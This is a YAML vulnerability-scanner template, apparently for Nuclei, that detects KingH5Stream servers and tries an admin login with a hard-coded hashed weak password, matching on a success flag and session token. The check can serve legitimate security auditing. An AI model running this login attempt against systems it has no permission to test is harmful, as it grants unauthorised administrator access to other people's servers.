id: poc-yaml-kingh5stream-weak-password
info:
  name: KingH5Stream Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password,kingh5stream
http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "KingH5Stream"
        part: body
  - raw:
      - |
        GET /api/v1/Login?user=admin&password=827ccb0eea8a706c4c34a16891f84e7b HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"bStatus": true'
        part: body
      - type: regex
        regex:
          - '"strSession": "[0-9a-zA-Z-]+"'
        part: body
      - type: word
        words:
          - "application/json"
        part: header
